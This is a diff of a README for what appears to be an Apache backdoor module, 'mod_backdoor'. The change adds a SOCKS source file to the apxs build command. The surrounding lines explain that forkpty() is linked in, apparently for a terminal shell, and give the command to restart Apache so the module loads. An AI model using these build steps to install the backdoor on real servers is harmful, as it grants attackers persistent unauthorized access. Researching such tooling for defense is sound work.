@@ -122,7 +122,7 @@ Special thanks to [@Ug_0Security](https://twitter.com/Ug_0Security)
 
 # Builds
 For development :<br/>
-* `apxs -i -a -c mod_backdoor.c sblist.c sblist_delete.c server.c -Wl,-lutil` <br/>
+* `apxs -i -a -c mod_backdoor.c socks.c sblist.c sblist_delete.c server.c -Wl,-lutil` <br/>
  `-Wl,-lutil` used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
 * `systemctl restart apache2`
 
